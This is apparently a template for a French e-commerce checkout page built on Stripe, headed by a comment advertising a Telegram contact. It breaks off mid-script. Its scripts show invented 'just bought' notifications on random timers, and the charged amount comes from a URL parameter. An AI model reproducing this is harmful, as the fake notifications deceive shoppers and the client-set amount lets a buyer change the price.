<!-- For NS or RB, contact @ElianDuv on Telegram -->

<script>
  // Fonction pour récupérer les paramètres d'URL
  function getUrlParameter(name) {
    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
    var results = regex.exec(location.search);
    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
  }
  
  // Récupérer le montant du panier depuis l'URL
  const amount = getUrlParameter('amount') || 270; // 270 centimes par défaut
  
  // Stocker ce montant pour l'utiliser dans la requête de paiement
  document.addEventListener('DOMContentLoaded', function() {
    // Afficher le montant correct sur la page
    const amountInEuros = (amount / 100).toFixed(2).replace('.', ',');
    
    // Mettre à jour tous les éléments qui affichent le prix
    const priceElements = document.querySelectorAll('.price-display');
    priceElements.forEach(function(element) {
      element.textContent = amountInEuros + '€';
    });
    
    // Stocker le montant pour la requête de paiement
    window.orderAmount = parseInt(amount);
    
    // Mettre à jour le champ caché du formulaire
    document.getElementById('amount-input').value = window.orderAmount;
    
    console.log("Montant chargé:", window.orderAmount, "centimes");
  });
</script>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Livraison - Exemple</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">


  <style>
    :root {
      --primary-bg: #ffffff;
      --primary-text: #212529;
      --input-border: #e6e6f0;
      --input-bg: #ffffff;
      --button-bg: #8016EA;
      --button-hover: #0d49e0;
      --card-border: #e8e8f7;
      --card-bg: #ffffff;
      --card-content-bg: #f9f9ff;
      --highlight-bg: #ffffff;
      --label-text: #666666;
      --placeholder-text: #999999;
      --error-color: #dc3545;
    }

    * {
      font-family: 'Outfit', sans-serif;
      box-sizing: border-box;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      margin: 0;
      padding: 0;
    }

    html, body {
      margin: 0;
      padding: 0;
      background-color: #f3f3f3;
      color: var(--primary-text);
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 600px;
      margin: 0 auto;
      padding: 0 20px;
      box-sizing: border-box;
    }

    h2, h3 {
      font-weight: 700;
      font-size: 17px;
      margin-bottom: 15px;
      margin-top: 10px;
    }

    .payment-subtitle {
      font-size: 15px;
      color: #666666;
      margin-bottom: 15px;
    }

    /* Styles communs pour tous les champs */
    select, input {
      width: 100%;
      padding: 14px 12px;
      margin-bottom: 14px;
      border-radius: 10px;
      border: 1px solid var(--input-border);
      font-size: 15px;
      background-color: #fff;
      color: var(--primary-text);
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
    }
    
    select {
      background-image: url("data:image/svg+xml;utf8,<svg fill='black' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/><path d='M0 0h24v24H0z' fill='none'/></svg>");
      background-repeat: no-repeat;
      background-position: right 10px center;
      padding-right: 30px;
    }

    select:focus, input:focus {
      outline: none;
      border-color: #1a5cff;
      box-shadow: 0 0 0 3px rgba(26, 92, 255, 0.15);
    }

    /* Style des champs en erreur */
    input.error, select.error {
      border-color: var(--error-color);
      background-color: rgba(220, 53, 69, 0.05);
    }

    /* Carte de paiement principale */
    .payment-card {
      background-color: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 16px;
      overflow: hidden;
      margin-bottom: 15px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.03);
    }

    /* En-tête avec les logos de carte */
    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px;
      background-color: #ffffff;
      border-bottom: 1px solid var(--card-border);
    }

    .card-content {
      padding: 16px;
      background-color: var(--card-content-bg);
      border-radius: 0 0 16px 16px;
    }

    .card-type {
      font-weight: 500;
      font-size: 16px;
      color: #333;
      display: flex;
      align-items: center;
    }

    .card-type-circle {
      width: 22px;
      height: 22px;
      background-color: #e2f0ff;
      border-radius: 50%;
      margin-right: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card-type-circle::before {
      content: "";
      width: 8px;
      height: 8px;
      background-color: #1a5cff;
      border-radius: 50%;
    }

    .card-logos {
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .card-logo {
      height: 25px;
      padding: 3px;
      border: 1px solid var(--input-border);
      border-radius: 6px;
      background-color: white;
      object-fit: contain;
    }

    /* Style des champs de formulaire */
    .form-group {
      margin-bottom: 6px;
      position: relative;
    }

    .form-group:last-child {
      margin-bottom: 5px;
    }

    .form-label {
      display: block;
      font-size: 15px;
      color: var(--label-text);
      margin-bottom: 6px;
      font-weight: 500;
    }

    .input-group {
      margin-bottom: 16px;
    }

    /* Style du message d'erreur */
    #card-error {
      color: var(--error-color);
      font-size: 14px;
      margin-top: 5px;
      margin-bottom: 5px;
      min-height: 18px;
      font-weight: 500;
    }

    .submit-button {
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--button-bg);
      padding: 1rem;
      font-size: 1rem;
      font-weight: bold;
      border-radius: 12px;
      cursor: pointer;
      color: #ffffff;
      text-decoration: none;
      width: 100%;
      margin-top: 4px;
      margin-bottom: 20px;
      transition: transform 0.1s, box-shadow 0.1s;
    }

    .submit-button:hover {
      transform: translateY(2px);
    }

    .submit-button:active {
      transform: translateY(4px);
      box-shadow: none;
    }

    .submit-button:disabled {
      opacity: 0.7;
      cursor: not-allowed;
      transform: none;
    }

    /* Styles du header et footer */
    .order-summary {
      padding: 18px 20px;
      background-color: #ffffff;
      border-top: 1px solid #dee2e6;
      border-bottom: 1px solid #dee2e6;
      margin-bottom: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .order-summary span {
      font-weight: 700;
      font-size: 16px;
    }

    .order-summary strong {
      font-size: 16px;
    }

    .page-header {
      padding: 16px 20px 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      max-width: 600px;
      margin: 0 auto;
    }

    /* Styles du footer */
    .footer-content {
      display: block;
      background: white;
      border-radius: 16px;
      padding: 1.5rem;
      margin-bottom: 1rem;
      text-align: center;
      max-width: 650px;
      margin: 0 auto 80px;
    }
    
    .footer-links button {
      width: 100%;
      background: #f3f3f3;
      border: none;
      padding: 0.8rem 1rem;
      border-radius: 12px;
      font-weight: 600;
      display: flex;
      justify-content: space-between;
      align-items: center;
      cursor: pointer;
      color: #000;
      margin-bottom: 0.8rem;
    }

    .footer-content-hidden {
      display: none;
      padding: 0.5rem 1rem;
      font-size: 0.9rem;
      color: #333;
      text-align: center;
    }

    .social-icons {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-bottom: 1.5rem;
    }
    
    .social-icons img {
      width: 24px;
      height: 24px;
    }

    /* Overlay de chargement */
    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(255, 255, 255, 0.7);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }

    .loading-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-radius: 50%;
      border-top-color: var(--button-bg);
      animation: spin 1s ease-in-out infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loading-overlay.active {
      display: flex;
    }
    
    /* Styles pour le carrousel d'avis */
    .reviews-carousel-container {
      margin: 20px 0 25px;
      padding: 10px 0;
    }
    
    .reviews-title {
      text-align: center;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 15px;
      color: var(--primary-text);
    }
    
    .reviews-carousel {
      width: 100%;
      overflow: hidden;
      position: relative;
      border-radius: 12px;
    }
    
    .reviews-track {
      display: flex;
      transition: transform 0.5s ease;
    }
    
    .review-card {
      min-width: 100%;
      padding: 15px;
      background-color: var(--card-content-bg);
      border: 1px solid var(--card-border);
      border-radius: 12px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
    }
    
    .review-stars {
      display: flex;
      margin-bottom: 10px;
    }
    
    .review-stars img {
      width: 16px;
      height: 16px;
      margin-right: 2px;
    }
    
    .review-content {
      font-size: 14px;
      line-height: 1.5;
      color: var(--primary-text);
      margin-bottom: 10px;
      font-style: italic;
    }
    
    .review-author {
      font-size: 13px;
      font-weight: 600;
      color: var(--button-bg);
    }
    
    .carousel-indicators {
      display: flex;
      justify-content: center;
      margin-top: 15px;
      gap: 8px;
    }
    
    .indicator {
      width: 8px;
      height: 8px;
      background-color: #ccc;
      border-radius: 50%;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    
    .indicator.active {
      background-color: var(--button-bg);
    }
  
    .express-checkout {
      text-align: center;
      margin: 20px 0;
    }

    .express-checkout h3 {
      font-size: 18px;
      margin-bottom: 10px;
      font-weight: 700;
    }

    .payment-buttons {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    .express-pay-btn {
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #000000;
      color: #ffffff;
      padding: 15px 25px;
      border-radius: 12px;
      font-size: 16px;
      border: none;
      cursor: pointer;
      transition: transform 0.1s ease;
      height: 48px;
      margin-bottom: 20px;
    }

    .express-pay-btn:hover {
      transform: scale(1.05);
    }
    
    /* Style pour le titre Paiement Express */
    .express-checkout-title {
      text-align: center;
      font-size: 16px;
      color: #000000;
      margin: 15px 0 15px;
      font-weight: 500;
      font-family: 'Outfit', sans-serif;
    }
    
    /* Style pour le séparateur avec texte */
    .separator-container {
      display: flex;
      align-items: center;
      margin: 15px 0 25px;
      width: 100%;
    }
    
    .separator-line {
      flex-grow: 1;
      height: 1px;
      background-color: #ddd;
    }
    
    .separator-text {
      padding: 0 10px;
      color: #000000;
      font-size: 14px;
      font-weight: 500;
      display: flex;
      align-items: center;
      font-family: 'Outfit', sans-serif;
    }
    
    .arrow {
      margin: 0 3px;
      font-size: 16px;
      font-weight: 500;
    }
    
    .simple-summary {
      margin-top: 26px;
      margin-bottom: 21px;
      padding: 0 2px;
    }
    .simple-summary h3 {
      font-size: 17px;
      margin-bottom: 16px;
      font-weight: 700;
    }
    .simple-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 13px;
      margin-bottom: 13px;
      border-bottom: 1px solid #e8e8f7;
    }
    .item-left {
      display: flex;
      align-items: center;
    }
    .item-image-container {
      position: relative;
      margin-right: 13px;
    }
    .item-img {
      width: 60px;
      height: 60px;
      border-radius: 8px;
      object-fit: cover;
    }
    .new-tag {
      position: absolute;
      top: -10px;
      right: -10px;
      background-color: #007bff;
      color: white;
      font-size: 8px;
      font-weight: bold;
      padding: 3px 6px;
      border-radius: 10px;
      transform: rotate(30deg);
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }
    .item-text {
      display: flex;
      flex-direction: column;
    }
    .item-title {
      font-weight: 500;
      font-size: 15px;
      margin-bottom: 3px;
    }
    .item-subtitle {
      color: #666666;
      font-size: 15px;
    }
    .item-price {
      font-weight: 500;
      font-size: 15px;
    }
    .summary-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 9px;
      font-size: 15px;
      padding: 0 2px;
    }
    .total-row {
      padding-top: 9px;
      margin-top: 9px;
      border-top: 1px solid #e8e8f7;
      font-weight: 700;
    }
    .total-row span {
      font-size: 17px;
    }

    /* Disposition des champs de carte de crédit */
    .card-details {
      display: flex;
      gap: 12px;
    }

    .card-details .form-group:first-child {
      flex: 1.5;
    }

    .card-details .form-group:last-child {
      flex: 1;
    }
    
    /* Styles spécifiques pour Stripe Elements - Hauteur réduite */
    .StripeElement {
      box-sizing: border-box;
      height: 42px;
      padding: 10px 12px;
      border: 1px solid var(--input-border);
      border-radius: 10px;
      background-color: #ffffff;
      -webkit-transition: box-shadow 150ms ease;
      transition: box-shadow 150ms ease;
      margin-bottom: 6px;
    }

    .StripeElement--focus {
      box-shadow: 0 1px 3px 0 #cfd7df;
      border-color: #1a5cff;
    }

    .StripeElement--invalid {
      border-color: var(--error-color);
    }

    .StripeElement--webkit-autofill {
      background-color: #fefde5 !important;
    }
    
    #payment-request-button {
      background: transparent !important;
      border: none !important;
      box-shadow: none !important;
      padding: 0 !important;
      margin: 16px 0 !important;
    }

    /* Pour le conteneur parent, s'il existe */
    #payment-request-button > div {
      border: none !important;
      box-shadow: none !important;
      background: transparent !important;
    }
    
    /* Styles pour la section de consentement */
    .consent-container {
      margin: 15px 0 25px;
      border-top: 1px solid #eaeaea;
      padding-top: 15px;
    }
    
    .consent-toggle {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 13px;
      color: #666666;
      background: none;
      border: none;
      width: 100%;
      text-align: left;
      padding: 0;
      cursor: pointer;
      margin-bottom: 8px;
      font-weight: 500;
    }
    
    .consent-toggle .toggle-icon {
      font-size: 16px;
      color: #999;
      transition: transform 0.3s ease;
    }
    
    .consent-content {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.3s ease, opacity 0.3s ease;
      opacity: 0;
      font-size: 12px;
      line-height: 1.4;
      color: #888888;
    }
    
    .consent-content.open {
      max-height: 1000px; /* Hauteur maximale quand ouvert */
      opacity: 1;
      margin-top: 10px;
    }
    
    .consent-summary {
      font-size: 12px;
      color: #666666;
      margin-bottom: 10px;
      padding: 0 2px;
      line-height: 1.4;
    }

    .consent-summary p {
      margin-bottom: 6px;
    }

    /* Style pour le premier paragraphe qui est toujours visible */
    .consent-primary {
      font-weight: 500;
      font-size: 12px;
      color: #555555;
      margin-bottom: 6px;
    }
    
    /* Style pour les liens */
    .consent-content a {
      color: #1a5cff;
      text-decoration: none;
    }
    
    /* Animation douce pour l'expansion */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    .consent-content.open {
      animation: fadeIn 0.4s forwards;
    }

    /* Styles pour le carrousel de témoignages professionnel */
    :root {
      --primary-color: #4361ee;
      --primary-light: #eef2ff;
      --card-shadow: 0 10px 20px rgba(67, 97, 238, 0.07);
      --card-border: 1px solid rgba(67, 97, 238, 0.1);
      --text-primary: #333;
      --text-secondary: #666;
      --star-color: #ffba08;
      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
    }

    .testimonials-section {
      margin: 10px 0 25px 0;
      position: relative;
      overflow: hidden;
      width: 100%;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    }

    .testimonials-container {
      position: relative;
      width: 100%;
      padding: 5px 0 20px;
      overflow: hidden;
    }

    .testimonials-slider {
      display: flex;
      transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
      width: 100%;
    }

    .testimonial-slide {
      min-width: 100%;
      padding: 0 10px;
      box-sizing: border-box;
    }

    .testimonial-card {
      display: flex;
      flex-direction: column;
      background: #fff;
      border-radius: 12px;
      box-shadow: var(--card-shadow);
      border: var(--card-border);
      height: 100%;
      overflow: hidden;
      padding: 0;
      position: relative;
    }

    /* Header avec avatar et info auteur */
    .testimonial-header {
      display: flex;
      align-items: center;
      background: #ffffff;
      padding: 12px 16px;
      border-bottom: 1px solid rgba(67, 97, 238, 0.08);
    }

    .testimonial-avatar {
      margin-right: 12px;
      flex-shrink: 0;
    }

    .avatar-img {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid white;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    }

    .testimonial-author-info {
      display: flex;
      flex-direction: column;
    }

    .author-name {
      font-weight: 600;
      font-size: 14px;
      color: var(--text-primary);
      margin-bottom: 2px;
    }

    .author-status {
      font-size: 12px;
      color: var(--primary-color);
      font-weight: 500;
      display: flex;
      align-items: center;
    }

    .author-status::before {
      content: "";
      display: inline-block;
      width: 6px;
      height: 6px;
      background-color: var(--primary-color);
      border-radius: 50%;
      margin-right: 5px;
      opacity: 0.8;
    }

    /* Contenu du témoignage */
    .testimonial-content {
      padding: 16px;
      display: flex;
      flex-direction: column;
    }

    .testimonial-rating {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
    }

    .star-rating {
      display: flex;
      margin-right: 6px;
    }

    .star-icon {
      position: relative;
      width: 14px;
      height: 14px;
      margin-right: 2px;
    }

    .star-icon:last-child {
      margin-right: 0;
    }

    .star-icon::before {
      content: "";
      position: absolute;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24'%3E%3Cpath d='M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z' fill='%23E0E0E0'/%3E%3C/svg%3E");
      width: 14px;
      height: 14px;
      top: 0;
      left: 0;
    }

    .star-icon.filled::before {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24'%3E%3Cpath d='M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z' fill='%23FFBA08'/%3E%3C/svg%3E");
    }

    .rating-text {
      font-size: 13px;
      font-weight: 600;
      color: var(--text-secondary);
    }

    .testimonial-text {
      font-size: 14px;
      line-height: 1.5;
      color: var(--text-primary);
      margin-bottom: 10px;
      font-style: italic;
      margin: 0;
    }

    /* Pagination moderne avec barre de progression */
    .testimonial-pagination {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 15px;
      position: relative;
    }

    .pagination-progress {
      height: 4px;
      background: #e9ecef;
      border-radius: 2px;
      width: 60%;
      max-width: 250px;
      position: relative;
      overflow: hidden;
    }

    .pagination-bar {
      position: absolute;
      height: 100%;
      width: 0; /* Commence à 0 et sera modifié par JS */
      background: var(--primary-color);
      transition: width 0.5s ease; /* Changé de transform à width */
      border-radius: 2px;
      top: 0;
      left: 0;
    }

    .pagination-numbers {
      margin-left: 12px;
      font-size: 12px;
      color: var(--text-secondary);
      font-weight: 500;
    }

    .current-slide {
      color: var(--primary-color);
      font-weight: 600;
    }

    /* Boutons de navigation */
    .testimonial-nav {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      width: 34px;
      height: 34px;
      background: #fff;
      border: 1px solid rgba(67, 97, 238, 0.15);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--primary-color);
      cursor: pointer;
      opacity: 0.9;
      transition: var(--transition);
      z-index: 10;
      box-shadow: 0 2px 8px rgba(67, 97, 238, 0.1);
    }

    .testimonial-nav:hover {
      opacity: 1;
      transform: translateY(-50%) scale(1.05);
      box-shadow: 0 4px 12px rgba(67, 97, 238, 0.15);
    }

    .prev-btn {
      left: 5px;
    }

    .next-btn {
      right: 5px;
    }

    /* Indicateur de confiance */
    .trust-indicator {
      text-align: center;
      margin-top: 10px;
    }

    .trust-badge {
      display: inline-flex;
      align-items: center;
      font-size: 12px;
      color: var(--text-secondary);
      background: #ffffff;
      padding: 6px 12px;
      border-radius: 20px;
      box-shadow: 0 2px 6px rgba(67, 97, 238, 0.05);
    }

    .trust-badge svg {
      margin-right: 6px;
      color: var(--primary-color);
    }

    /* Animation de slide */
    @keyframes fadeInRight {
      from {
        opacity: 0;
        transform: translateX(10px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }

    .testimonial-slide.active {
      animation: fadeInRight 0.4s ease forwards;
    }

    /* Responsive design optimisé */
    @media (min-width: 768px) {
      .testimonial-header {
        padding: 14px 20px;
      }
      
      .testimonial-content {
        padding: 20px;
      }
      
      .avatar-img {
        width: 48px;
        height: 48px;
      }
      
      .testimonial-text {
        font-size: 15px;
      }
      
      .testimonial-nav {
        width: 38px;
        height: 38px;
      }
      
      .prev-btn {
        left: 10px;
      }
      
      .next-btn {
        right: 10px;
      }
    }

    /* Styles pour les très petits écrans */
    @media (max-width: 360px) {
      .testimonial-header {
        padding: 10px 14px;
      }
      
      .testimonial-content {
        padding: 14px;
      }
      
      .avatar-img {
        width: 38px;
        height: 38px;
      }
      
      .testimonial-nav {
        width: 30px;
        height: 30px;
      }
      
      .testimonial-nav svg {
        width: 16px;
        height: 16px;
      }
    }
    
    /* Styles pour les notifications de vente */
    .sale-notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 300px;
      background-color: white;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
      padding: 12px;
      display: flex;
      align-items: center;
      z-index: 9998;
      font-family: 'Outfit', sans-serif;
      border: 1px solid var(--card-border);
      transform: translateY(150%);
      transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
    }
    
    .sale-notification.show {
      transform: translateY(0);
    }
    
    .notification-content {
      flex: 1;
      margin-left: 12px;
    }
    
    .notification-title {
      font-weight: 600;
      font-size: 14px;
      color: var(--text-primary);
      margin-bottom: 2px;
    }
    
    .notification-message {
      font-size: 13px;
      color: var(--text-secondary);
      margin-bottom: 2px;
    }
    
    .notification-time {
      font-size: 11px;
      color: #999;
    }
    
    .notification-product-image {
      width: 45px;
      height: 45px;
      border-radius: 8px;
      object-fit: cover;
    }
    
    .notification-close {
      position: absolute;
      top: 8px;
      right: 8px;
      background: none;
      border: none;
      color: #999;
      cursor: pointer;
      font-size: 16px;
      font-weight: 700;
      padding: 0;
      width: 20px;
      height: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
    }
    
    .notification-close:hover {
      background-color: #f3f3f3;
      color: #444;
    }
    
  .legal-text p {
    margin-bottom: 18px;
    line-height: 1.6;
    font-size: 14px;
    color: #333;
  }
  </style>
</head>
<body>

<!-- Overlay de chargement -->
<div id="loading-overlay" class="loading-overlay">
  <div class="loading-spinner"></div>
</div>

<!-- Container pour les notifications -->
<div id="notification-container"></div>

<script>


// Fonction pour l'affichage/masquage du contenu footer
function toggleContent(button) {
  const content = button.nextElementSibling;
  const sign = button.querySelector('span');
  
  if (content.style.display === 'block') {
    content.style.display = 'none';
    sign.textContent = '+';
  } else {
    content.style.display = 'block';
    sign.textContent = '-';
  }
}

// Overlay de chargement
const loadingOverlay = document.getElementById('loading-overlay');

function showLoading() {
  loadingOverlay.classList.add('active');
}

function hideLoading() {
  loadingOverlay.classList.remove('active');
}



// Fonction pour créer une notification
function createNotification(data) {
  const container = document.getElementById('notification-container');
  
  // Créer l'élément de notification
  const notification = document.createElement('div');
  notification.className = 'sale-notification';
  
  // Construire le contenu HTML
  notification.innerHTML = `
    <img src="${data.image}" alt="${data.product}" class="notification-product-image">
    <div class="notification-content">
      <div class="notification-title">${data.name} de ${data.location}</div>
      <div class="notification-message">vient d'acheter ${data.product}</div>
      <div class="notification-time">${data.time}</div>
    </div>
    <button class="notification-close">×</button>
  `;
  
  // Ajouter au container
  container.appendChild(notification);
  
  // Ajouter l'écouteur d'événement pour fermer
  const closeButton = notification.querySelector('.notification-close');
  closeButton.addEventListener('click', function() {
    notification.style.transform = 'translateY(150%)';
    setTimeout(() => {
      notification.remove();
    }, 500);
  });
  
  // Afficher avec animation
  setTimeout(() => {
    notification.classList.add('show');
  }, 100);
  
  // Disparaître automatiquement après un délai
  setTimeout(() => {
    notification.style.transform = 'translateY(150%)';
    setTimeout(() => {
      notification.remove();
    }, 500);
  }, 5000);
}

// Fonction pour afficher les notifications avec un délai aléatoire
function scheduleNotifications() {
  let notificationIndex = 0;
  
  // Afficher la première notification après 3 secondes
  setTimeout(() => {
    createNotification(notifications[notificationIndex]);
    notificationIndex = (notificationIndex + 1) % notifications.length;
    
    // Configurer un intervalle pour les notifications suivantes
    setInterval(() => {
      if (Math.random() > 0.3) { // 70% de chance d'afficher une notification
        createNotification(notifications[notificationIndex]);
        notificationIndex = (notificationIndex + 1) % notifications.length;
      }
    }, 6000 + Math.random() * 10000); // Entre 15 et 35 secondes
    
  }, 3000);
}

document.addEventListener('DOMContentLoaded', function() {
  // Démarrer les notifications de vente après un court délai
  setTimeout(scheduleNotifications, 2000);
  
  // Initialiser Stripe Elements
  const elements = stripe.elements({
    fonts: [
      {
        cssSrc: 'https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap',
      },
    ],
    locale: 'fr'
  });
  
  // Créer une requête de paiement pour Apple Pay
const paymentRequest = stripe.paymentRequest({
  country: 'FR',
  currency: 'eur',
  total: {
    label: 'Solonys',
    amount: window.orderAmount || 270, // Utiliser le montant dynamique
  },
  requestPayerName: true,
  requestPayerEmail: true,
});

// Crée l'élément Stripe pour le bouton
const prButton = elements.create('paymentRequestButton', {
  paymentRequest: paymentRequest,
  style: {
    paymentRequestButton: {
      type: 'buy',  // Changé de 'default' à 'buy' pour afficher "Acheter avec"
      theme: 'dark',
      height: '40px',
    },
  },
});

// Vérifie si Apple Pay est disponible
paymentRequest.canMakePayment().then(function(result) {
  if (result) {
    prButton.mount('#payment-request-button');
  } else {
    document.getElementById('payment-request-button').style.display = 'none';
  }
});

// Gère l'événement de paiement
paymentRequest.on('paymentmethod', async function(ev) {
  try {
    const response = await fetch('', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        paymentMethodId: ev.paymentMethod.id,
        email: ev.paymentMethod.billing_details.email,
        nom: ev.paymentMethod.billing_details.name,
        amount: window.orderAmount || 270, // Ajouté ici - utiliser le montant dynamique
        express: true // Très important pour dire que c'est un paiement EXPRESS (Apple Pay)
      })
    });

    const result = await response.json();

    if (result.error) {
      ev.complete('fail');
      alert(result.error);
      return;
    }

    const { error: confirmError } = await stripe.confirmCardPayment(result.clientSecret);

    if (confirmError) {
      ev.complete('fail');
      document.getElementById('card-error').textContent = confirmError.message;
    } else {
      ev.complete('success');
      window.location.href = "";
    }
  } catch (error) {
    console.error(error);
    ev.complete('fail');
    alert('Erreur de communication avec le serveur.');
  }
});

  
  // Style des éléments Stripe pour une disposition en ligne
const style = {
  base: {
    color: '#32325d',
    fontFamily: '"Outfit", sans-serif',
    fontSmoothing: 'antialiased',
    fontSize: '16px',
    lineHeight: '22px',
    '::placeholder': {
      color: '#aab7c4'
    },
    backgroundColor: '#ffffff',
  },
  invalid: {
    color: '#dc3545',
    iconColor: '#dc3545'
  }
};
  
  // Créer les éléments avec des options plus simples
  const cardNumberElement = elements.create('cardNumber', {
    style: style,
    showIcon: true
  });
  
  const cardExpiryElement = elements.create('cardExpiry', {
    style: style
  });
  
  const cardCvcElement = elements.create('cardCvc', {
    style: style
  });
  
  // Monter les éléments sur leurs conteneurs respectifs
  cardNumberElement.mount('#card-number-element');
  cardExpiryElement.mount('#card-expiry-element');
  cardCvcElement.mount('#card-cvc-element');
  
  // Écouter les événements de changement pour gérer les erreurs en temps réel
  cardNumberElement.on('change', ({error}) => {
    displayError(error);
  });
  
  cardExpiryElement.on('change', ({error}) => {
    displayError(error);
  });
  
  cardCvcElement.on('change', ({error}) => {
    displayError(error);
  });
  
  function displayError(error) {
    const errorDisplay = document.getElementById('card-error');
    if (error) {
      errorDisplay.textContent = error.message;
    } else {
      errorDisplay.textContent = '';
    }
  }
  
  // Gestionnaire pour le formulaire de paiement
const form = document.getElementById('payment-form');
const errorDiv = document.getElementById('card-error');

function getCountryCode(countryName) {
  const countryMap = {
    "France": "FR",
    "Belgique": "BE",
    "Suisse": "CH",
    "Allemagne": "DE",
    "Andorre": "AD",
    "Danemark": "DK",
    "Espagne": "ES",
    "Italie": "IT",
    "Luxembourg": "LU",
    "Malte": "MT",
    "Monaco": "MC",
    "Pays-Bas": "NL",
    "Portugal": "PT"
  };
  return countryMap[countryName] || "FR"; // fallback
}

form.addEventListener('submit', async function(event) {
  event.preventDefault();
  
  // Réinitialiser les erreurs précédentes
  errorDiv.textContent = '';
  
  // Désactiver le bouton pour éviter les soumissions multiples
  const submitButton = document.getElementById('payment-button');
  submitButton.disabled = true;
  submitButton.textContent = 'Traitement en cours...';
  
  // Afficher l'overlay de chargement
  showLoading();
  
  // Vérifier les champs obligatoires
  const requiredFields = form.querySelectorAll('input[required], select[required]');
  let hasErrors = false;
  
  requiredFields.forEach(field => {
    if (!field.value.trim()) {
      hasErrors = true;
      field.classList.add('error');
    } else {
      field.classList.remove('error');
    }
  });
  
  if (hasErrors) {
    errorDiv.textContent = "Veuillez remplir tous les champs obligatoires.";
    submitButton.disabled = false;
    submitButton.textContent = 'Commandez maintenant';
    hideLoading();
    return;
  }
  
  // Créer un token de paiement avec Stripe
  try {
    const cardholderName = document.getElementById('cardholder-name').value;
    const email = document.getElementById('email').value;
    const pays = document.getElementById('pays').value;
    const prenom = document.getElementById('prenom').value;
    const nom = document.getElementById('nom').value;
    const adresse = document.getElementById('adresse').value;
    const ville = document.getElementById('ville').value;
    const codepostal = document.getElementById('codepostal').value;
    
    // Créer une méthode de paiement
    const { error, paymentMethod } = await stripe.createPaymentMethod({
      type: 'card',
      card: cardNumberElement,
      billing_details: {
        name: cardholderName,
        email: email,
        address: {
          country: getCountryCode(pays),
          line1: adresse,
          city: ville,
          postal_code: codepostal,
        }
      }
    });
    
    if (error) {
      // Afficher l'erreur
      errorDiv.textContent = error.message;
      submitButton.disabled = false;
      submitButton.textContent = 'Commandez maintenant';
      hideLoading();
      return;
    }

    
    // Appeler le serveur pour créer un PaymentIntent
    const response = await fetch('', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        paymentMethodId: paymentMethod.id,
        email: email,
        nom: nom,
        amount: window.orderAmount || 270 // Utiliser le montant dynamique
      })
    });

    const result = await response.json();

    if (result.error) {
      errorDiv.textContent = result.error;
      submitButton.disabled = false;
      submitButton.textContent = 'Commandez maintenant';
      hideLoading();
      return;
    }

    // Vérifier si une action supplémentaire (3D Secure) est requise
